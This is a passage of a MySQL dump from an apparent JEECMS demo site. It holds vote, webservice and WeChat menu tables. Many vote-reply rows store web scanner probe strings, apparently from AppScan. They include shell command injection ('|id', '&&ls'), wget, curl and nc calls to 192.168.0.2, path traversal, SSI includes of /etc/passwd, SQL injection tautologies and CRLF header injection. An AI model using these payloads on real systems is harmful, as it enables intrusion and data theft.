INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (45,'99999999999999999999',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (46,'1234＃&&lt;&＃40;, \"&gt;;',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (47,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (48,'-99999999999999999999',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (49,'|id',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (50,'|ls -a1F',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (51,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (52,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (53,'&&id',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (54,'4294967297',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (55,'ls',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (56,'&&ls -a1F',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (57,'18446744073709551617',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (58,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (59,'||id',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (60,'||ls -a1F',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (61,'\0',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (62,'&＃39; | &＃39;id',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (63,'&＃39; | &＃39;ls -a1F',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (64,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (65,'\" | \"id',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (66,'|vol',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (67,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (68,'\" | \"ls -a1F',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (69,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (70,'id',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (71,'&&vol',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (72,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (73,'id|',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (74,'ls -a1F',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (75,';id\0',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (76,'1234\"|wget http://192.168.0.2:51167/AppScanMsg.html?varId=1269|echo \"',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (77,'||vol',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (78,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (79,'../../../../../../../../../../../../bin/id|',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (80,';ls -a1F\0',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (81,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (82,'&＃39; | &＃39;vol',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (83,'1234&＃39;|wget http://192.168.0.2:51167/AppScanMsg.html?varId=1275|echo &＃39;',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (84,'../../../../../../../../../../../../usr/bin/id|',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (85,'0 0 0 1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (86,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (87,'\" | \"vol',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (88,'1234|wget http://192.168.0.2:51167/AppScanMsg.html?varId=1276|echo ;',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (89,'1234&＃39; and &＃39;f&＃39;=&＃39;f',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (90,';vol\0',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (91,'1234&＃39; and &＃39;f&＃39;=&＃39;f&＃39; -- ',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (92,'1234&＃39; and &＃39;f&＃39;=&＃39;f&＃39;&＃41; -- ',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (93,'1234&＃39; and &＃39;b&＃39;=&＃39;f',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (94,'1234\"|echo -e \"GET /AppScanMsg.html?varId=1280 HTTP/1.0\\r\\n\\r\\n\" | nc 192.168.0.2 51167|echo \"',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (95,'1234&＃39; and &＃39;b&＃39;=&＃39;f&＃39; -- ',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (96,'1234&＃39; and &＃39;b&＃39;=&＃39;f&＃39;&＃41; --',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (97,'1234&＃39; or &＃39;f&＃39;=&＃39;f',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (98,'1234&＃39; or &＃39;f&＃39;=&＃39;f&＃39; -- ',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (99,'1234&＃39;|echo -e \"GET /AppScanMsg.html?varId=1288 HTTP/1.0\\r\\n\\r\\n\" | nc 192.168.0.2 51167|echo &＃39;',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (100,'1234&＃39; or &＃39;f&＃39;=&＃39;f&＃39;&＃41; --',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (101,'&lt;!--＃include file=\"/etc/passwd\"--&gt;',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (102,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (103,'&lt;!--＃include file=\"C:\\boot.ini\"--&gt;',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (104,'1234|echo -e \"GET /AppScanMsg.html?varId=1289 HTTP/1.0\\r\\n\\r\\n\" | nc 192.168.0.2 51167|echo ',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (105,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (106,'1234 and 7659=7659',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (107,';vol|',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (108,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (109,'1234;curl http://192.168.0.2:51167/AppScanMsg.html?varId=1290;',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (110,'1234 and 0=7659',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (111,'1234/**/and/**/7659=7659',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (112,'&＃39;   ltrim&＃40;&＃39;&＃39;&＃41;   &＃39;1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (113,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (114,'1234 or 7659=7659',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (115,'&＃39;   &＃39;   &＃39;1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (116,'1234/**/and/**/0=7659',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (117,'12345 12345 1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (118,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (119,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (120,'1234&＃39;   &＃39;   &＃39;',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (121,'1234/**/or/**/7659=7659',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (122,'1234 and 7659=7659',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (123,'12345-1234-1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (124,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (125,'&＃40;select 1234&＃41;',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (126,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (127,'&＃39; || &＃39;&＃39; || &＃39;1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (128,'1234 and abc=7659',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (129,'&＃40;select 1234,1234&＃41;',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (130,'&＃39; || &＃39; || &＃39;1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (131,'&＃39;',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (132,'1234 or',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (133,'1234&＃39; || &＃39; || &＃39;',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (134,'&＃40;select 1234,',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (135,'AVAK$&＃40;RETURN_CODE&＃41;OS',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (136,'\\&＃39;',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (137,';',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (138,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (139,'\"',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (140,'1234',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (141,'1234XYZ',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (142,'\\\"',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (143,'1234kqprobebg000043',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (144,'1234\rAppScanHeader: AppScanValue/1.2-1350\rSecondAppScanHeader: whatever',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (145,'&＃41;',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (146,'kqprobebg000043',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (147,'1234\r\nAppScanHeader: AppScanValue/1.2-1355\r\nSecondAppScanHeader: whatever',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (148,'\"&＃39;',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (149,'1234&＃39;Akqprobebg000043',14);
INSERT INTO `jc_vote_reply` (`votereply_id`,`reply`,`subtopic_id`) VALUES (150,'1234\"Akqprobebg000043',14);

#
# Source for table jc_vote_subtopic
#

CREATE TABLE `jc_vote_subtopic` (
  `subtopic_id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL DEFAULT '' COMMENT '标题',
  `votetopic_id` int(11) NOT NULL DEFAULT '0' COMMENT '投票（调查）',
  `subtopic_type` int(2) NOT NULL DEFAULT '1' COMMENT '类型（1单选，2多选，3文本）',
  `priority` int(11) DEFAULT NULL,
  PRIMARY KEY (`subtopic_id`),
  KEY `FK_jc_vote_subtopic_vote` (`votetopic_id`)
) ENGINE=InnoDB AUTO_INCREMENT=28 DEFAULT CHARSET=utf8 COMMENT='投票子题目';

#
# Dumping data for table jc_vote_subtopic
#

INSERT INTO `jc_vote_subtopic` (`subtopic_id`,`title`,`votetopic_id`,`subtopic_type`,`priority`) VALUES (13,'V8版本演示站网页的设计风格您喜欢吗？',2,1,1);
INSERT INTO `jc_vote_subtopic` (`subtopic_id`,`title`,`votetopic_id`,`subtopic_type`,`priority`) VALUES (14,'我觉得这里完善一下：',2,3,3);
INSERT INTO `jc_vote_subtopic` (`subtopic_id`,`title`,`votetopic_id`,`subtopic_type`,`priority`) VALUES (15,'V8版本比V7版的设计风格有改进吗？',2,1,2);
INSERT INTO `jc_vote_subtopic` (`subtopic_id`,`title`,`votetopic_id`,`subtopic_type`,`priority`) VALUES (16,'您觉得V8演示站哪些模块做的比较好',2,2,4);
INSERT INTO `jc_vote_subtopic` (`subtopic_id`,`title`,`votetopic_id`,`subtopic_type`,`priority`) VALUES (18,'上海工资收入',3,1,1);
INSERT INTO `jc_vote_subtopic` (`subtopic_id`,`title`,`votetopic_id`,`subtopic_type`,`priority`) VALUES (20,'你喜欢哪个',4,1,1);
INSERT INTO `jc_vote_subtopic` (`subtopic_id`,`title`,`votetopic_id`,`subtopic_type`,`priority`) VALUES (21,'你支持哪个选手？',5,1,1);
INSERT INTO `jc_vote_subtopic` (`subtopic_id`,`title`,`votetopic_id`,`subtopic_type`,`priority`) VALUES (22,'你支持哪个选手？',6,1,1);
INSERT INTO `jc_vote_subtopic` (`subtopic_id`,`title`,`votetopic_id`,`subtopic_type`,`priority`) VALUES (23,'你支持哪个选手？',7,1,1);
INSERT INTO `jc_vote_subtopic` (`subtopic_id`,`title`,`votetopic_id`,`subtopic_type`,`priority`) VALUES (24,'你支持哪个选手？',8,1,1);
INSERT INTO `jc_vote_subtopic` (`subtopic_id`,`title`,`votetopic_id`,`subtopic_type`,`priority`) VALUES (25,'你支持哪个学校？',9,1,1);
INSERT INTO `jc_vote_subtopic` (`subtopic_id`,`title`,`votetopic_id`,`subtopic_type`,`priority`) VALUES (26,'国庆长假结束,您尽兴了吗?',10,1,1);
INSERT INTO `jc_vote_subtopic` (`subtopic_id`,`title`,`votetopic_id`,`subtopic_type`,`priority`) VALUES (27,'你对取消住房公积金怎么看？',11,1,1);

#
# Source for table jc_vote_topic
#

CREATE TABLE `jc_vote_topic` (
  `votetopic_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL COMMENT '标题',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `start_time` datetime DEFAULT NULL COMMENT '开始时间',
  `end_time` datetime DEFAULT NULL COMMENT '结束时间',
  `repeate_hour` int(11) DEFAULT NULL COMMENT '重复投票限制时间，单位小时，为空不允许重复投票',
  `total_count` int(11) NOT NULL DEFAULT '0' COMMENT '总投票数',
  `multi_select` int(11) NOT NULL DEFAULT '1' COMMENT '最多可以选择几项',
  `is_restrict_member` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否限制会员',
  `is_restrict_ip` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否限制IP',
  `is_restrict_cookie` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否限制COOKIE',
  `is_disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  `is_def` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否默认主题',
  `limit_weixin` tinyint(1) DEFAULT '0' COMMENT '是否限制微信',
  `vote_day` int(11) DEFAULT '0' COMMENT '限定微信投票每个用户每日投票次数,为0时则投票期内限定投票一次',
  PRIMARY KEY (`votetopic_id`),
  KEY `fk_jc_votetopic_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8 COMMENT='CMS投票主题';

#
# Dumping data for table jc_vote_topic
#

INSERT INTO `jc_vote_topic` (`votetopic_id`,`site_id`,`title`,`description`,`start_time`,`end_time`,`repeate_hour`,`total_count`,`multi_select`,`is_restrict_member`,`is_restrict_ip`,`is_restrict_cookie`,`is_disabled`,`is_def`,`limit_weixin`,`vote_day`) VALUES (2,1,'JEECMS演示站改版用户问卷调查','JEECMSv8版正式发布了，伴随着系统的完善，jeecms演示站的模板也一直在不断的改版，针对此次改版，jeecms美工团队特邀您参与“JEECMS演示站改版用户问卷调查”，希望大家能提出宝贵的意见，我们一定认真改进，谢谢大家的支持！',NULL,NULL,NULL,84,1,0,0,0,0,1,0,0);
INSERT INTO `jc_vote_topic` (`votetopic_id`,`site_id`,`title`,`description`,`start_time`,`end_time`,`repeate_hour`,`total_count`,`multi_select`,`is_restrict_member`,`is_restrict_ip`,`is_restrict_cookie`,`is_disabled`,`is_def`,`limit_weixin`,`vote_day`) VALUES (3,1,'工资收入问卷调查','工资收入问卷调查','2016-09-30 14:51:49','2016-09-30 15:00:49',NULL,1,1,0,0,1,0,0,0,0);
INSERT INTO `jc_vote_topic` (`votetopic_id`,`site_id`,`title`,`description`,`start_time`,`end_time`,`repeate_hour`,`total_count`,`multi_select`,`is_restrict_member`,`is_restrict_ip`,`is_restrict_cookie`,`is_disabled`,`is_def`,`limit_weixin`,`vote_day`) VALUES (4,1,'男神女神主持选拔大赛','男神女神主持选拔大赛开始了，美女帅哥云集，大家快来投票吧！',NULL,'2020-10-09 10:30:13',NULL,0,1,0,0,1,0,0,0,0);
INSERT INTO `jc_vote_topic` (`votetopic_id`,`site_id`,`title`,`description`,`start_time`,`end_time`,`repeate_hour`,`total_count`,`multi_select`,`is_restrict_member`,`is_restrict_ip`,`is_restrict_cookie`,`is_disabled`,`is_def`,`limit_weixin`,`vote_day`) VALUES (5,1,'最美志愿者评选','',NULL,'2019-01-09 10:33:59',NULL,0,1,0,0,1,0,0,0,0);
INSERT INTO `jc_vote_topic` (`votetopic_id`,`site_id`,`title`,`description`,`start_time`,`end_time`,`repeate_hour`,`total_count`,`multi_select`,`is_restrict_member`,`is_restrict_ip`,`is_restrict_cookie`,`is_disabled`,`is_def`,`limit_weixin`,`vote_day`) VALUES (6,1,'2015年度好声音评选','',NULL,'2016-12-31 10:35:16',NULL,0,1,0,0,1,0,0,0,0);
INSERT INTO `jc_vote_topic` (`votetopic_id`,`site_id`,`title`,`description`,`start_time`,`end_time`,`repeate_hour`,`total_count`,`multi_select`,`is_restrict_member`,`is_restrict_ip`,`is_restrict_cookie`,`is_disabled`,`is_def`,`limit_weixin`,`vote_day`) VALUES (7,1,'“樱花女神”评选大赛 第一季','',NULL,'2017-10-18 10:36:42',NULL,0,1,0,0,1,0,0,0,0);
INSERT INTO `jc_vote_topic` (`votetopic_id`,`site_id`,`title`,`description`,`start_time`,`end_time`,`repeate_hour`,`total_count`,`multi_select`,`is_restrict_member`,`is_restrict_ip`,`is_restrict_cookie`,`is_disabled`,`is_def`,`limit_weixin`,`vote_day`) VALUES (8,1,'微信拍照大奖赛优秀作品 投票 开始啦','',NULL,'2016-10-27 10:37:50',NULL,0,1,0,0,1,0,0,0,0);
INSERT INTO `jc_vote_topic` (`votetopic_id`,`site_id`,`title`,`description`,`start_time`,`end_time`,`repeate_hour`,`total_count`,`multi_select`,`is_restrict_member`,`is_restrict_ip`,`is_restrict_cookie`,`is_disabled`,`is_def`,`limit_weixin`,`vote_day`) VALUES (9,1,'南昌“我的校园我的家 温馨校园”评选活动','',NULL,'2017-12-01 10:38:52',NULL,0,1,0,0,1,0,0,0,0);
INSERT INTO `jc_vote_topic` (`votetopic_id`,`site_id`,`title`,`description`,`start_time`,`end_time`,`repeate_hour`,`total_count`,`multi_select`,`is_restrict_member`,`is_restrict_ip`,`is_restrict_cookie`,`is_disabled`,`is_def`,`limit_weixin`,`vote_day`) VALUES (10,1,'国庆长假结束,您尽兴了吗?','',NULL,'2017-10-10 10:40:41',NULL,37,1,0,0,1,0,0,0,0);
INSERT INTO `jc_vote_topic` (`votetopic_id`,`site_id`,`title`,`description`,`start_time`,`end_time`,`repeate_hour`,`total_count`,`multi_select`,`is_restrict_member`,`is_restrict_ip`,`is_restrict_cookie`,`is_disabled`,`is_def`,`limit_weixin`,`vote_day`) VALUES (11,1,'专家建议取消住房公积金，这事儿你咋看？','',NULL,'2018-10-18 10:42:29',NULL,16,1,0,0,1,0,0,0,0);

#
# Source for table jc_webservice
#

CREATE TABLE `jc_webservice` (
  `service_id` int(11) NOT NULL AUTO_INCREMENT,
  `service_address` varchar(255) NOT NULL DEFAULT '' COMMENT '接口地址',
  `target_namespace` varchar(255) DEFAULT NULL,
  `success_result` varchar(255) DEFAULT '' COMMENT '正确返回值',
  `service_type` varchar(50) DEFAULT NULL COMMENT '接口类型',
  `service_operate` varchar(50) DEFAULT NULL COMMENT '接口操作',
  PRIMARY KEY (`service_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='接口表';

#
# Dumping data for table jc_webservice
#


#
# Source for table jc_webservice_auth
#

CREATE TABLE `jc_webservice_auth` (
  `auth_id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL COMMENT '用户名',
  `password` varchar(50) NOT NULL COMMENT '密码',
  `system` varchar(100) NOT NULL COMMENT '系统',
  `is_enable` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否启用',
  PRIMARY KEY (`auth_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='webservices认证表';

#
# Dumping data for table jc_webservice_auth
#


#
# Source for table jc_webservice_call_record
#

CREATE TABLE `jc_webservice_call_record` (
  `record_id` int(11) NOT NULL AUTO_INCREMENT,
  `service_code` varchar(50) NOT NULL COMMENT '接口识别码',
  `auth_id` int(11) NOT NULL COMMENT '调用的认证',
  `record_time` datetime NOT NULL COMMENT '调用时间',
  PRIMARY KEY (`record_id`),
  KEY `fk_webservice_record_auth` (`auth_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='接口调用记录';

#
# Dumping data for table jc_webservice_call_record
#


#
# Source for table jc_webservice_param
#

CREATE TABLE `jc_webservice_param` (
  `service_id` int(11) NOT NULL DEFAULT '0',
  `priority` int(11) NOT NULL DEFAULT '0' COMMENT '排列顺序',
  `param_name` varchar(100) NOT NULL DEFAULT '' COMMENT '参数名',
  `default_value` varchar(255) DEFAULT NULL COMMENT '默认值',
  KEY `fk_param_webservice` (`service_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='接口参数表';

#
# Dumping data for table jc_webservice_param
#


#
# Source for table jg_weixin
#

CREATE TABLE `jg_weixin` (
  `site_id` int(11) NOT NULL DEFAULT '0' COMMENT '站点ID',
  `wx_pic` varchar(255) DEFAULT NULL COMMENT '微信二维码',
  `wx_welcome` varchar(255) NOT NULL DEFAULT '' COMMENT '关注欢迎语'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

#
# Dumping data for table jg_weixin
#

INSERT INTO `jg_weixin` (`site_id`,`wx_pic`,`wx_welcome`) VALUES (1,'/u/cms/www/201510/08105041f9xd.jpg','江西金磊科技有限公司欢迎您!');

#
# Source for table jg_weixinmenu
#

CREATE TABLE `jg_weixinmenu` (
  `wm_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL DEFAULT '0' COMMENT '站点ID',
  `wm_name` varchar(255) DEFAULT NULL COMMENT '微信菜单名称',
  `wm_type` varchar(255) DEFAULT NULL COMMENT '微信菜单类别',
  `wm_url` varchar(255) DEFAULT NULL COMMENT '链接地址',
  `wm_key` varchar(255) DEFAULT NULL COMMENT '点击key',
  `wm_parent_id` int(11) DEFAULT NULL COMMENT '父节点',
  PRIMARY KEY (`wm_id`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8;

#
# Dumping data for table jg_weixinmenu
#

INSERT INTO `jg_weixinmenu` (`wm_id`,`site_id`,`wm_name`,`wm_type`,`wm_url`,`wm_key`,`wm_parent_id`) VALUES (1,1,'找官方','view','http://demo.jeecms.com/html/news/','1',NULL);
INSERT INTO `jg_weixinmenu` (`wm_id`,`site_id`,`wm_name`,`wm_type`,`wm_url`,`wm_key`,`wm_parent_id`) VALUES (2,1,'演示站','view','http://demo.jeecms.com/html/picture/','2',NULL);
INSERT INTO `jg_weixinmenu` (`wm_id`,`site_id`,`wm_name`,`wm_type`,`wm_url`,`wm_key`,`wm_parent_id`) VALUES (3,1,'新闻资讯','view','http://demo.jeecms.com/html/veido/','3',NULL);
INSERT INTO `jg_weixinmenu` (`wm_id`,`site_id`,`wm_name`,`wm_type`,`wm_url`,`wm_key`,`wm_parent_id`) VALUES (4,1,'论坛','view','http://bbs.jeecms.com','4',1);
INSERT INTO `jg_weixinmenu` (`wm_id`,`site_id`,`wm_name`,`wm_type`,`wm_url`,`wm_key`,`wm_parent_id`) VALUES (5,1,'官网','view','http://www.jeecms.com/','5',1);
INSERT INTO `jg_weixinmenu` (`wm_id`,`site_id`,`wm_name`,`wm_type`,`wm_url`,`wm_key`,`wm_parent_id`) VALUES (6,1,'JSPGOU','view','http://demo3.jeecms.com','6',2);
INSERT INTO `jg_weixinmenu` (`wm_id`,`site_id`,`wm_name`,`wm_type`,`wm_url`,`wm_key`,`wm_parent_id`) VALUES (7,1,'JEEBBS','view','http://bbs.jeecms.com','7',2);
INSERT INTO `jg_weixinmenu` (`wm_id`,`site_id`,`wm_name`,`wm_type`,`wm_url`,`wm_key`,`wm_parent_id`) VALUES (8,1,'图库','view','http://demo.jeecms.com/news/index.jhtml/pic/index.jhtml','8',3);
INSERT INTO `jg_weixinmenu` (`wm_id`,`site_id`,`wm_name`,`wm_type`,`wm_url`,`wm_key`,`wm_parent_id`) VALUES (9,1,'新闻','click','','news',3);
INSERT INTO `jg_weixinmenu` (`wm_id`,`site_id`,`wm_name`,`wm_type`,`wm_url`,`wm_key`,`wm_parent_id`) VALUES (10,1,'JEECMS','view','http://demo.jeecms.com/','',2);
INSERT INTO `jg_weixinmenu` (`wm_id`,`site_id`,`wm_name`,`wm_type`,`wm_url`,`wm_key`,`wm_parent_id`) VALUES (11,1,'视频','view','http://demo.jeecms.com/veido/index.jhtml','',3);
INSERT INTO `jg_weixinmenu` (`wm_id`,`site_id`,`wm_name`,`wm_type`,`wm_url`,`wm_key`,`wm_parent_id`) VALUES (12,1,'下载','view','http://demo.jeecms.com/download/index.jhtml','http://demo19.jeecms.com/download/index.jhtml',3);
INSERT INTO `jg_weixinmenu` (`wm_id`,`site_id`,`wm_name`,`wm_type`,`wm_url`,`wm_key`,`wm_parent_id`) VALUES (13,1,'调查','view','http://demo.jeecms.com/survey.jhtml','http://demo19.jeecms.com/wldc/index.jhtml',3);
INSERT INTO `jg_weixinmenu` (`wm_id`,`site_id`,`wm_name`,`wm_type`,`wm_url`,`wm_key`,`wm_parent_id`) VALUES (14,1,'JSPGOU店中店','view','http://dzd.jeecms.com/','http://dzd.jeecms.com/',2);

#
# Source for table jg_weixinmessage
#

CREATE TABLE `jg_weixinmessage` (
  `wm_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL DEFAULT '0' COMMENT '站点ID',
  `wm_number` varchar(255) DEFAULT NULL COMMENT '序号',
  `wm_title` varchar(255) DEFAULT NULL COMMENT '标题',
  `wm_path` varchar(255) DEFAULT NULL COMMENT '图片地址',
